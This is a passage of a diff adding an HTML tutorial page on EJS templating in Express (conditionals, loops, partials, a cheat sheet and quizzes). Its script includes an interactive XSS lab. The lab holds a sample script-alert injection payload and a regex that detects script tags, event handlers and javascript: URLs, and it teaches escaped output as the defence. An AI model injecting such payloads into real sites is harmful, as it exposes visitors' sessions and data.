+<span class="token-operator">&lt;%</span> } <span class="token-operator">%&gt;</span></pre></div>
+
+      <h3>else if — multiple states</h3>
+<div class="code-block"><div class="code-header"><span class="code-label">views/orders/detail.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-operator">&lt;%</span> <span class="token-yaml-key">if</span> (order.status <span class="token-operator">===</span> <span class="token-string">'delivered'</span>) { <span class="token-operator">%&gt;</span>
+  <span class="token-flag">&lt;span</span> class=<span class="token-string">"tag green"</span><span class="token-flag">&gt;</span>Delivered<span class="token-flag">&lt;/span</span><span class="token-flag">&gt;</span>
+<span class="token-operator">&lt;%</span> } <span class="token-yaml-key">else</span> <span class="token-yaml-key">if</span> (order.status <span class="token-operator">===</span> <span class="token-string">'shipped'</span>) { <span class="token-operator">%&gt;</span>
+  <span class="token-flag">&lt;span</span> class=<span class="token-string">"tag blue"</span><span class="token-flag">&gt;</span>On the way<span class="token-flag">&lt;/span</span><span class="token-flag">&gt;</span>
+<span class="token-operator">&lt;%</span> } <span class="token-yaml-key">else</span> { <span class="token-operator">%&gt;</span>
+  <span class="token-flag">&lt;span</span> class=<span class="token-string">"tag gold"</span><span class="token-flag">&gt;</span>Processing<span class="token-flag">&lt;/span</span><span class="token-flag">&gt;</span>
+<span class="token-operator">&lt;%</span> } <span class="token-operator">%&gt;</span></pre></div>
+
+      <h3>Ternary — for small bits of text or classes</h3>
+<div class="code-block"><div class="code-header"><span class="code-label">views/products/list.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-flag">&lt;button</span> class="<span class="token-operator">&lt;%=</span> product.stock &gt; <span class="token-val">0</span> ? <span class="token-string">'btn'</span> : <span class="token-string">'btn disabled'</span> <span class="token-operator">%&gt;</span>"<span class="token-flag">&gt;</span>
+  <span class="token-operator">&lt;%=</span> product.stock &gt; <span class="token-val">0</span> ? <span class="token-string">'Add to cart'</span> : <span class="token-string">'Out of stock'</span> <span class="token-operator">%&gt;</span>
+<span class="token-flag">&lt;/button</span><span class="token-flag">&gt;</span></pre></div>
+
+      <h3>Loops — always handle the empty state</h3>
+<div class="code-block"><div class="code-header"><span class="code-label">views/products/list.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-flag">&lt;h1</span><span class="token-flag">&gt;</span><span class="token-operator">&lt;%=</span> title <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/h1</span><span class="token-flag">&gt;</span>
+
+<span class="token-operator">&lt;%</span> <span class="token-yaml-key">if</span> (products.length <span class="token-operator">===</span> <span class="token-val">0</span>) { <span class="token-operator">%&gt;</span>
+  <span class="token-flag">&lt;p</span><span class="token-flag">&gt;</span>No products yet. Check back soon!<span class="token-flag">&lt;/p</span><span class="token-flag">&gt;</span>
+<span class="token-operator">&lt;%</span> } <span class="token-yaml-key">else</span> { <span class="token-operator">%&gt;</span>
+  <span class="token-flag">&lt;ul</span> class=<span class="token-string">"product-grid"</span><span class="token-flag">&gt;</span>
+    <span class="token-operator">&lt;%</span> products.<span class="token-command">forEach</span>((product, index) <span class="token-operator">=&gt;</span> { <span class="token-operator">%&gt;</span>
+      <span class="token-flag">&lt;li</span><span class="token-flag">&gt;</span>
+        <span class="token-flag">&lt;span</span><span class="token-flag">&gt;</span>#<span class="token-operator">&lt;%=</span> index + <span class="token-val">1</span> <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/span</span><span class="token-flag">&gt;</span>
+        <span class="token-flag">&lt;h3</span><span class="token-flag">&gt;</span><span class="token-operator">&lt;%=</span> product.name <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/h3</span><span class="token-flag">&gt;</span>
+        <span class="token-flag">&lt;p</span><span class="token-flag">&gt;</span>₹<span class="token-operator">&lt;%=</span> product.price <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/p</span><span class="token-flag">&gt;</span>
+      <span class="token-flag">&lt;/li</span><span class="token-flag">&gt;</span>
+    <span class="token-operator">&lt;%</span> }) <span class="token-operator">%&gt;</span>
+  <span class="token-flag">&lt;/ul</span><span class="token-flag">&gt;</span>
+<span class="token-operator">&lt;%</span> } <span class="token-operator">%&gt;</span></pre></div>
+      <p><code>for...of</code> works too, and reads nicely when you don't need the index:</p>
+<div class="code-block"><div class="code-header"><span class="code-label">views/profile.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-flag">&lt;ul</span><span class="token-flag">&gt;</span>
+  <span class="token-operator">&lt;%</span> <span class="token-yaml-key">for</span> (<span class="token-yaml-key">const</span> skill <span class="token-yaml-key">of</span> skills) { <span class="token-operator">%&gt;</span>
+    <span class="token-flag">&lt;li</span><span class="token-flag">&gt;</span><span class="token-operator">&lt;%=</span> skill <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/li</span><span class="token-flag">&gt;</span>
+  <span class="token-operator">&lt;%</span> } <span class="token-operator">%&gt;</span>
+<span class="token-flag">&lt;/ul</span><span class="token-flag">&gt;</span></pre></div>
+
+      <h3>Looping over an object</h3>
+<div class="code-block"><div class="code-header"><span class="code-label">views/products/detail.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-comment">&lt;%# specs = { Fabric: 'Cotton', Fit: 'Oversized', Wash: 'Machine' } %&gt;</span>
+<span class="token-flag">&lt;table</span><span class="token-flag">&gt;</span>
+  <span class="token-operator">&lt;%</span> <span class="token-yaml-key">for</span> (<span class="token-yaml-key">const</span> [key, value] <span class="token-yaml-key">of</span> Object.<span class="token-command">entries</span>(product.specs)) { <span class="token-operator">%&gt;</span>
+    <span class="token-flag">&lt;tr</span><span class="token-flag">&gt;</span><span class="token-flag">&lt;td</span><span class="token-flag">&gt;</span><span class="token-operator">&lt;%=</span> key <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/td</span><span class="token-flag">&gt;</span><span class="token-flag">&lt;td</span><span class="token-flag">&gt;</span><span class="token-operator">&lt;%=</span> value <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/td</span><span class="token-flag">&gt;</span><span class="token-flag">&lt;/tr</span><span class="token-flag">&gt;</span>
+  <span class="token-operator">&lt;%</span> } <span class="token-operator">%&gt;</span>
+<span class="token-flag">&lt;/table</span><span class="token-flag">&gt;</span></pre></div>
+
+      <h3>Nested loops</h3>
+<div class="code-block"><div class="code-header"><span class="code-label">views/menu.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-operator">&lt;%</span> categories.<span class="token-command">forEach</span>(category <span class="token-operator">=&gt;</span> { <span class="token-operator">%&gt;</span>
+  <span class="token-flag">&lt;h2</span><span class="token-flag">&gt;</span><span class="token-operator">&lt;%=</span> category.name <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/h2</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;ul</span><span class="token-flag">&gt;</span>
+    <span class="token-operator">&lt;%</span> category.items.<span class="token-command">forEach</span>(item <span class="token-operator">=&gt;</span> { <span class="token-operator">%&gt;</span>
+      <span class="token-flag">&lt;li</span><span class="token-flag">&gt;</span><span class="token-operator">&lt;%=</span> item.name <span class="token-operator">%&gt;</span> — ₹<span class="token-operator">&lt;%=</span> item.price <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/li</span><span class="token-flag">&gt;</span>
+    <span class="token-operator">&lt;%</span> }) <span class="token-operator">%&gt;</span>
+  <span class="token-flag">&lt;/ul</span><span class="token-flag">&gt;</span>
+<span class="token-operator">&lt;%</span> }) <span class="token-operator">%&gt;</span></pre></div>
+
+      <div class="note-box">
+        <div class="note-box-icon">💡</div>
+        <p class="note-box-text"><strong>Templates display, routes decide.</strong> Filtering, sorting, formatting prices and calculating totals belong in the route or a service — pass the finished values to the template. If a template has more JavaScript than HTML, move that logic out.</p>
+      </div>
+
+      <div class="warning-box">
+        <div class="warning-box-icon">⚠️</div>
+        <p class="warning-box-text"><strong>Forgot a closing brace?</strong> A missing <code>&lt;% } %&gt;</code> or <code>&lt;% }) %&gt;</code> gives a confusing error like <strong>Unexpected token 'catch' while compiling ejs</strong>. The error points at EJS's generated code, not your line. Count your opening and closing braces — every <code>{</code> needs its own <code>&lt;% } %&gt;</code>.</p>
+      </div>
+
+      <div class="quiz-box"><div class="quiz-tag">Quick check</div><p class="quiz-question">What's wrong here? <code>&lt;% if (user) { %&gt; Hi &lt;%= user.name %&gt;</code></p><div class="quiz-options" id="quiz-flow-1"><button type="button" onclick="answerQuiz('quiz-flow-1', this, true)" class="quiz-option">A &nbsp;—&nbsp; The closing <code>&lt;% } %&gt;</code> is missing</button><button type="button" onclick="answerQuiz('quiz-flow-1', this, false)" class="quiz-option">B &nbsp;—&nbsp; Nothing — EJS closes the block automatically</button></div><div class="quiz-feedback hidden" id="quiz-flow-1-feedback"></div></div>
+      <div class="quiz-box"><div class="quiz-tag">Quick check</div><p class="quiz-question">Where should you format prices and filter products?</p><div class="quiz-options" id="quiz-flow-2"><button type="button" onclick="answerQuiz('quiz-flow-2', this, true)" class="quiz-option">A &nbsp;—&nbsp; In the route or controller, before <code>res.render()</code></button><button type="button" onclick="answerQuiz('quiz-flow-2', this, false)" class="quiz-option">B &nbsp;—&nbsp; Inside the template, in big logic blocks</button></div><div class="quiz-feedback hidden" id="quiz-flow-2-feedback"></div></div>
+    </section>
+
+    <hr class="divider">
+
+    <!-- ═════════════ 10 Partials ═════════════ -->
+    <section class="section-block animate-fade-up" id="partials">
+      <div class="section-header">
+        <div class="section-num-big">10</div>
+        <div class="section-header-text">
+          <div class="section-title">Partials</div>
+          <div class="section-subtitle">Write the navbar once, use it on every page</div>
+        </div>
+      </div>
+
+      <p>Your site has 10 pages, and every page has the same <code>&lt;head&gt;</code>, navbar and footer. Copy-paste them, and changing one link means editing 10 files — and you will miss one. <strong>Partials</strong> are small EJS files that other templates include.</p>
+
+      <div class="step-row"><span class="badge badge-accent">Step 1 — Create the partials</span></div>
+<div class="code-block"><div class="code-header"><span class="code-label">views/</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre">views/
+├── partials/
+│   ├── header.ejs         ← doctype, &lt;head&gt;, navbar
+│   ├── footer.ejs         ← footer, closing tags
+│   └── product-card.ejs   ← one reusable card
+├── home.ejs
+└── products/
+    └── list.ejs</pre></div>
+<div class="code-block"><div class="code-header"><span class="code-label">views/partials/header.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-comment">&lt;!DOCTYPE html&gt;</span>
+<span class="token-flag">&lt;html</span> lang=<span class="token-string">"en"</span><span class="token-flag">&gt;</span>
+<span class="token-flag">&lt;head</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;meta</span> charset=<span class="token-string">"UTF-8"</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;title</span><span class="token-flag">&gt;</span><span class="token-operator">&lt;%=</span> title <span class="token-operator">%&gt;</span> · Shop<span class="token-flag">&lt;/title</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;link</span> rel=<span class="token-string">"stylesheet"</span> href=<span class="token-string">"/css/style.css"</span><span class="token-flag">&gt;</span>
+<span class="token-flag">&lt;/head</span><span class="token-flag">&gt;</span>
+<span class="token-flag">&lt;body</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;nav</span><span class="token-flag">&gt;</span>
+    <span class="token-flag">&lt;a</span> href=<span class="token-string">"/"</span> class="<span class="token-operator">&lt;%=</span> locals.active <span class="token-operator">===</span> <span class="token-string">'home'</span> ? <span class="token-string">'active'</span> : <span class="token-string">''</span> <span class="token-operator">%&gt;</span>"<span class="token-flag">&gt;</span>Home<span class="token-flag">&lt;/a</span><span class="token-flag">&gt;</span>
+    <span class="token-flag">&lt;a</span> href=<span class="token-string">"/products"</span> class="<span class="token-operator">&lt;%=</span> locals.active <span class="token-operator">===</span> <span class="token-string">'products'</span> ? <span class="token-string">'active'</span> : <span class="token-string">''</span> <span class="token-operator">%&gt;</span>"<span class="token-flag">&gt;</span>Products<span class="token-flag">&lt;/a</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;/nav</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;main</span><span class="token-flag">&gt;</span></pre></div>
+<div class="code-block"><div class="code-header"><span class="code-label">views/partials/footer.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre">  <span class="token-flag">&lt;/main</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;footer</span><span class="token-flag">&gt;</span>© <span class="token-operator">&lt;%=</span> <span class="token-yaml-key">new</span> <span class="token-command">Date</span>().<span class="token-command">getFullYear</span>() <span class="token-operator">%&gt;</span> Shop<span class="token-flag">&lt;/footer</span><span class="token-flag">&gt;</span>
+<span class="token-flag">&lt;/body</span><span class="token-flag">&gt;</span>
+<span class="token-flag">&lt;/html</span><span class="token-flag">&gt;</span></pre></div>
+
+      <div class="step-row"><span class="badge badge-accent">Step 2 — Include them in a page</span></div>
+<div class="code-block"><div class="code-header"><span class="code-label">views/home.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-operator">&lt;%-</span> <span class="token-command">include</span>(<span class="token-string">'partials/header'</span>, { title: <span class="token-string">'Home'</span>, active: <span class="token-string">'home'</span> }) <span class="token-operator">%&gt;</span>
+
+  <span class="token-flag">&lt;h1</span><span class="token-flag">&gt;</span>Welcome to the shop<span class="token-flag">&lt;/h1</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;p</span><span class="token-flag">&gt;</span>New drops every Friday.<span class="token-flag">&lt;/p</span><span class="token-flag">&gt;</span>
+
+<span class="token-operator">&lt;%-</span> <span class="token-command">include</span>(<span class="token-string">'partials/footer'</span>) <span class="token-operator">%&gt;</span></pre></div>
+
+      <div class="concept-box">
+        <div class="concept-box-label">Why <code>&lt;%-</code> and not <code>&lt;%=</code>?</div>
+        <p class="concept-box-text"><code>include()</code> returns a string of HTML. With <code>&lt;%=</code> that HTML gets escaped, and your page would literally show <code>&lt;nav&gt;&lt;a href=...</code> as text. The header is HTML <em>you</em> wrote, so raw output is safe here — this is the main legitimate use of <code>&lt;%-</code>.</p>
+      </div>
+
+      <h3>Passing data to a partial</h3>
+      <ul>
+        <li>A partial <strong>automatically sees everything the page received</strong> from <code>res.render()</code>. If the route passed <code>user</code>, the header can use <code>user</code>.</li>
+        <li>The second argument of <code>include()</code> <strong>adds extra values</strong> just for that partial: <code>{ title: 'Home', active: 'home' }</code>.</li>
+        <li>For values that some pages pass and others don't (like <code>active</code>), read them with <code>locals.active</code> so pages without it don't crash.</li>
+      </ul>
+
+      <h3>Partials as components</h3>
+      <p>Partials aren't only for headers. Pull a repeated block into its own file and include it inside a loop — the closest thing EJS has to a component:</p>
+<div class="code-block"><div class="code-header"><span class="code-label">views/partials/product-card.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-flag">&lt;article</span> class=<span class="token-string">"card"</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;img</span> src="<span class="token-operator">&lt;%=</span> product.image <span class="token-operator">%&gt;</span>" alt="<span class="token-operator">&lt;%=</span> product.name <span class="token-operator">%&gt;</span>" loading=<span class="token-string">"lazy"</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;h3</span><span class="token-flag">&gt;</span><span class="token-operator">&lt;%=</span> product.name <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/h3</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;p</span> class=<span class="token-string">"price"</span><span class="token-flag">&gt;</span>₹<span class="token-operator">&lt;%=</span> product.price <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/p</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;a</span> href="/products/<span class="token-operator">&lt;%=</span> product._id <span class="token-operator">%&gt;</span>"<span class="token-flag">&gt;</span>View details<span class="token-flag">&lt;/a</span><span class="token-flag">&gt;</span>
+<span class="token-flag">&lt;/article</span><span class="token-flag">&gt;</span></pre></div>
+<div class="code-block"><div class="code-header"><span class="code-label">views/products/list.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-operator">&lt;%-</span> <span class="token-command">include</span>(<span class="token-string">'../partials/header'</span>, { title: <span class="token-string">'Products'</span>, active: <span class="token-string">'products'</span> }) <span class="token-operator">%&gt;</span>
+
+  <span class="token-flag">&lt;section</span> class=<span class="token-string">"grid"</span><span class="token-flag">&gt;</span>
+    <span class="token-operator">&lt;%</span> products.<span class="token-command">forEach</span>(product <span class="token-operator">=&gt;</span> { <span class="token-operator">%&gt;</span>
+      <span class="token-operator">&lt;%-</span> <span class="token-command">include</span>(<span class="token-string">'../partials/product-card'</span>, { product }) <span class="token-operator">%&gt;</span>
+    <span class="token-operator">&lt;%</span> }) <span class="token-operator">%&gt;</span>
+  <span class="token-flag">&lt;/section</span><span class="token-flag">&gt;</span>
+
+<span class="token-operator">&lt;%-</span> <span class="token-command">include</span>(<span class="token-string">'../partials/footer'</span>) <span class="token-operator">%&gt;</span></pre></div>
+
+      <div class="note-box">
+        <div class="note-box-icon">💡</div>
+        <p class="note-box-text"><strong>Paths are relative to the current file.</strong> <code>views/home.ejs</code> uses <code>'partials/header'</code>, but <code>views/products/list.ejs</code> is one folder deeper, so it needs <code>'../partials/header'</code>.</p>
+      </div>
+      <div class="warning-box">
+        <div class="warning-box-icon">⚠️</div>
+        <p class="warning-box-text"><strong>Old tutorials use <code>&lt;% include partials/header %&gt;</code>.</strong> That syntax was removed in EJS v3 and now throws a compile error. Always use the function form: <code>&lt;%- include('partials/header') %&gt;</code>.</p>
+      </div>
+
+      <div class="quiz-box"><div class="quiz-tag">Quick check</div><p class="quiz-question">Why do we write <code>&lt;%- include('partials/header') %&gt;</code> and not <code>&lt;%= … %&gt;</code>?</p><div class="quiz-options" id="quiz-partials-1"><button type="button" onclick="answerQuiz('quiz-partials-1', this, true)" class="quiz-option">A &nbsp;—&nbsp; include() returns HTML, and <code>&lt;%=</code> would escape it into visible tags</button><button type="button" onclick="answerQuiz('quiz-partials-1', this, false)" class="quiz-option">B &nbsp;—&nbsp; <code>&lt;%=</code> can't call functions</button></div><div class="quiz-feedback hidden" id="quiz-partials-1-feedback"></div></div>
+      <div class="quiz-box"><div class="quiz-tag">Quick check</div><p class="quiz-question">Inside <code>views/products/list.ejs</code>, how do you include <code>views/partials/header.ejs</code>?</p><div class="quiz-options" id="quiz-partials-2"><button type="button" onclick="answerQuiz('quiz-partials-2', this, false)" class="quiz-option">A &nbsp;—&nbsp; <code>include('partials/header')</code></button><button type="button" onclick="answerQuiz('quiz-partials-2', this, true)" class="quiz-option">B &nbsp;—&nbsp; <code>include('../partials/header')</code></button></div><div class="quiz-feedback hidden" id="quiz-partials-2-feedback"></div></div>
+    </section>
+
+    <hr class="divider">
+
+    <!-- ═════════════ 11 Cheat sheet ═════════════ -->
+    <section class="section-block animate-fade-up" id="cheatsheet">
+      <div class="section-header">
+        <div class="section-num-big">11</div>
+        <div class="section-header-text">
+          <div class="section-title">Cheat Sheet</div>
+          <div class="section-subtitle">Everything from this module on one screen</div>
+        </div>
+      </div>
+
+      <div class="table-wrap">
+      <table class="flag-table">
+        <thead><tr><th>You want to…</th><th>Write</th></tr></thead>
+        <tbody>
+          <tr><td>Use EJS in Express</td><td><code>app.set('view engine', 'ejs')</code></td></tr>
+          <tr><td>Set the templates folder</td><td><code>app.set('views', path.join(__dirname, 'views'))</code></td></tr>
+          <tr><td>Serve CSS and images</td><td><code>app.use(express.static('public'))</code></td></tr>
+          <tr><td>Render a page with data</td><td><code>res.render('products/list', { products })</code></td></tr>
+          <tr><td>Print a value safely</td><td><code>&lt;%= product.name %&gt;</code></td></tr>
+          <tr><td>Run logic without printing</td><td><code>&lt;% if (user) { %&gt; … &lt;% } %&gt;</code></td></tr>
+          <tr><td>Print trusted HTML / a partial</td><td><code>&lt;%- include('partials/header') %&gt;</code></td></tr>
+          <tr><td>Leave a server-only comment</td><td><code>&lt;%# note %&gt;</code></td></tr>
+          <tr><td>Check an optional value</td><td><code>&lt;% if (locals.error) { %&gt;</code></td></tr>
+          <tr><td>Loop over an array</td><td><code>&lt;% items.forEach(item =&gt; { %&gt; … &lt;% }) %&gt;</code></td></tr>
+          <tr><td>Pass extra data to a partial</td><td><code>&lt;%- include('partials/card', { product }) %&gt;</code></td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <div class="note-box">
+        <div class="note-box-icon">💡</div>
+        <p class="note-box-text"><strong>Up next:</strong> we'll put all of this together in a mini project — real data from MongoDB, a shared header and footer, loops with empty states, and every user value printed safely.</p>
+      </div>
+    </section>
+
+    <footer class="site-footer">
+      <span>Sheryians Coding School · Backend Domination · EJS Notes</span>
+      <span>Stack: Node.js · Express · EJS</span>
+    </footer>
+
+  </div>
+  </main>
+</div>
+
+<script>
+{
+  /* ── Copy buttons ── */
+  window.copyCode = function (btn) {
+    const pre = btn.closest('.code-block').querySelector('pre');
+    const done = (label) => { btn.textContent = label; setTimeout(() => { btn.textContent = 'copy'; }, 1600); };
+    try {
+      navigator.clipboard.writeText(pre.innerText).then(() => done('copied'), () => selectText(pre, done));
+    } catch (e) { selectText(pre, done); }
+  };
+  function selectText(el, done) {
+    const r = document.createRange(); r.selectNodeContents(el);
+    const s = window.getSelection(); s.removeAllRanges(); s.addRange(r);
+    done('ctrl+c');
+  }
+
+  /* ── Quizzes ── */
+  window.answerQuiz = function (quizId, btn, isCorrect) {
+    const container = document.getElementById(quizId);
+    const feedback = document.getElementById(`${quizId}-feedback`);
+    container.querySelectorAll('.quiz-option').forEach(b => {
+      b.disabled = true;
+      b.classList.add('cursor-not-allowed');
+      b.style.opacity = '0.6';
+    });
+    if (isCorrect) {
+      btn.classList.add('correct');
+      feedback.textContent = '✓ Correct!';
+      feedback.className = 'quiz-feedback correct';
+    } else {
+      btn.classList.add('incorrect');
+      feedback.textContent = '✗ Not quite — try reviewing that section.';
+      feedback.className = 'quiz-feedback incorrect';
+    }
+  };
+
+  /* ── Label table cells for the stacked phone layout ── */
+  document.querySelectorAll('.table-wrap table').forEach(t => {
+    const heads = [...t.querySelectorAll('thead th')].map(th => th.textContent.trim());
+    t.querySelectorAll('tbody tr').forEach(tr => [...tr.children].forEach((td, i) => { td.dataset.l = heads[i] || ''; }));
+  });
+
+  /* ── Scroll-aware sidebar ── */
+  const links = [...document.querySelectorAll('.nav-link')];
+  const byId = new Map(links.map(a => [a.getAttribute('href').slice(1), a]));
+  const setActive = (id) => {
+    links.forEach(a => a.classList.toggle('active', a === byId.get(id)));
+    const a = byId.get(id);
+    if (a && window.matchMedia('(max-width: 900px)').matches) {
+      const nav = a.parentElement;
+      const outLeft = a.offsetLeft < nav.scrollLeft;
+      const outRight = a.offsetLeft + a.offsetWidth > nav.scrollLeft + nav.clientWidth;
+      if (outLeft || outRight) nav.scrollTo({ left: a.offsetLeft - 16, behavior: 'smooth' });
+    }
+  };
+  if ('IntersectionObserver' in window) {
+    const io = new IntersectionObserver((entries) => {
+      entries.forEach(e => { if (e.isIntersecting) setActive(e.target.id); });
+    }, { rootMargin: '-20% 0px -70% 0px' });
+    document.querySelectorAll('section.section-block').forEach(s => io.observe(s));
+  }
+
+  /* ── Race to first paint (step-through) ── */
+  const palette = ['#C84B1F', '#1A6B4A', '#1B4587'];
+  const products = [['Oversized Tee', '₹799'], ['Cargo Pants', '₹1,499'], ['Denim Jacket', '₹2,299']];
+  const pageHTML = (dim) => `<div class="${dim ? 'dim' : ''}"><div class="shop-head"><span class="shop-logo">Shop.</span><span class="shop-cart">cart (0)</span></div><div class="shop-grid">${products.map((p, i) => `<div class="card-p"><div class="img" style="background:${palette[i]}22;border:1px solid ${palette[i]}44"></div><div class="nm">${p[0]}</div><div class="pr">${p[1]}</div></div>`).join('')}</div></div>`;
+  const screens = {
+    loading: () => `<div class="scr-center"><div class="spinner"></div>connecting…</div>`,
+    blank: () => `<div class="scr-center">blank white screen</div>`,
+    skeleton: () => `<div class="shop-head"><span class="sk" style="width:40px;height:10px"></span><span class="sk" style="width:30px;height:8px"></span></div><div class="shop-grid">${[0,1,2].map(() => `<div class="card-p"><div class="img sk"></div><div class="sk" style="height:7px;margin-bottom:4px"></div><div class="sk" style="height:7px;width:60%"></div></div>`).join('')}</div>`,
+    page: () => pageHTML(false),
+    reload: () => `<div class="loadbar"></div>${pageHTML(true)}`
+  };
+  const steps = [
+    { cap: 'The user opens shop.com/products',
+      csr: { s: 'loading', d: 'req', l: 'GET /products', log: 'The browser asks the server for the page.' },
+      ssr: { s: 'loading', d: 'req', l: 'GET /products', log: 'The browser asks the server for the page.' } },
+    { cap: 'The server responds — very differently',
+      csr: { s: 'blank', d: 'res', l: 'index.html (empty shell)', log: 'The server instantly returns an almost empty HTML file: just <div id="root"> and a script tag. Nothing to show yet.' },
+      ssr: { s: 'loading', d: 'work', l: 'querying DB + rendering EJS', log: 'The server fetches products from MongoDB and fills them into the EJS template. The user waits a moment.' } },
+    { cap: 'First real content appears… on one side',
+      csr: { s: 'blank', d: 'res', l: 'bundle.js (large)', log: 'The browser downloads the JavaScript bundle — React, your code and every library. Still a blank screen.' },
+      ssr: { s: 'page', d: 'res', l: 'complete HTML page', log: 'The finished HTML arrives with the products already inside. The user can read the page right away.', done: true } },
+    { cap: 'CSR finally starts working',
+      csr: { s: 'skeleton', d: 'req', l: 'GET /api/products', log: 'The JS runs, React mounts and shows a loading skeleton, then asks the API for the data.' },
+      ssr: { s: 'page', d: 'none', l: '', log: 'The user is already reading and scrolling. CSS and images load in the background.', done: true } },
+    { cap: 'Both show content — and each has a trade-off',
+      csr: { s: 'page', d: 'res', l: 'JSON data', log: 'The JSON arrives and React builds the list in the browser. Content visible at last — but from now on, moving to another page only needs new JSON.', done: true },
+      ssr: { s: 'reload', d: 'req', l: 'GET /products?page=2', log: 'Trade-off: clicking "Next page" requests a whole new HTML page, so the screen reloads. The CSR app would just fetch more JSON.', done: true } }
+  ];
+  let step = 0;
+  const $ = (id) => document.getElementById(id);
+  const dots = $('race-dots');
+  dots.innerHTML = steps.map(() => '<span></span>').join('');
+  const firstDone = (side) => steps.findIndex(s => s[side].done) + 1;
+  function paintLane(side, st) {
+    $(side + '-screen').innerHTML = screens[st.s]();
+    const line = $(side + '-line');
+    line.setAttribute('class', st.d === 'req' ? 'flowing animate-data-flow' : st.d === 'res' ? 'flowing animate-data-flow reverse' : '');
+    const label = $(side + '-label');
+    label.textContent = st.d === 'req' ? st.l + ' →' : st.d === 'res' ? '← ' + st.l : st.l;
+    label.style.color = st.d === 'work' ? 'var(--gold)' : '';
+    $(side + '-log').textContent = st.log;
+    const status = $(side + '-status');
+    status.textContent = st.done ? `content visible · step ${firstDone(side)}` : 'waiting for content';
+    status.classList.toggle('done', !!st.done);
+    $(side + '-url').textContent = st.s === 'reload' ? 'shop.com/products?page=2' : 'shop.com/products';
+  }
+  function render() {
+    const s = steps[step];
+    $('race-caption').textContent = s.cap;
+    paintLane('csr', s.csr);
+    paintLane('ssr', s.ssr);
+    $('race-counter').textContent = `Step ${step + 1} / ${steps.length}`;
+    [...dots.children].forEach((d, i) => d.classList.toggle('on', i <= step));
+    $('race-back').disabled = step === 0;
+    $('race-next').disabled = step === steps.length - 1;
+  }
+  $('race-back').addEventListener('click', () => { if (step > 0) { step--; render(); } });
+  $('race-next').addEventListener('click', () => { if (step < steps.length - 1) { step++; render(); } });
+  $('race').addEventListener('keydown', (e) => {
+    if (e.key === 'ArrowRight') $('race-next').click();
+    if (e.key === 'ArrowLeft') $('race-back').click();
+  });
+  render();
+
+  /* ── XSS lab ── */
+  const escapeHTML = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&#34;').replace(/'/g, '&#39;');
+  const input = $('xss-input');
+  let mode = 'escaped';
+  input.value = "<script>alert('hacked')<\/script>";
+  function runLab() {
+    const v = input.value;
+    const sent = mode === 'escaped' ? escapeHTML(v) : v;
+    $('xss-out').textContent = `<p class="bio">${sent}</p>`;
+    const res = $('xss-result');
+    const dangerous = /<\s*script|\son\w+\s*=|javascript:|<\s*iframe|<\s*svg/i.test(v);
+    const hasTags = /<[a-z!\/]/i.test(v);
+    res.innerHTML = '';
+    const verdict = document.createElement('span'); verdict.className = 'verdict';
+    const p = document.createElement('p');
+    if (mode === 'escaped') {
+      res.className = 'lab-result safe';
+      verdict.textContent = '✓ Shown as plain text';
+      p.textContent = hasTags ? 'Every < and > became an entity, so the browser displays the characters. No tag is created, no code runs. The visitor sees:' : 'Nothing special to escape. The visitor sees:';
+      const shown = document.createElement('div'); shown.className = 'shown'; shown.textContent = v || '(empty)';
+      res.append(verdict, p, shown);
+    } else if (dangerous) {
+      res.className = 'lab-result danger';
+      verdict.textContent = '⚠ Attacker code runs';
+      p.textContent = 'The browser treats this as real HTML and executes the script for every visitor who opens this profile — it can read their cookies, call your API as them, or rewrite the page.';
+      res.append(verdict, p);
+    } else if (hasTags) {
+      res.className = 'lab-result neutral';
+      verdict.textContent = '! Rendered as HTML';
+      p.textContent = 'The tags become real elements (here, formatting). Harmless this time — but you have handed control of your page\'s HTML to whoever typed this. The next user can send a <script>.';
+      res.append(verdict, p);
+    } else {
+      res.className = 'lab-result neutral';
+      verdict.textContent = 'Looks the same — for now';
+      p.textContent = 'Plain text renders the same with both tags. That\'s why <%- bugs slip through testing: they only show up when someone types HTML.';
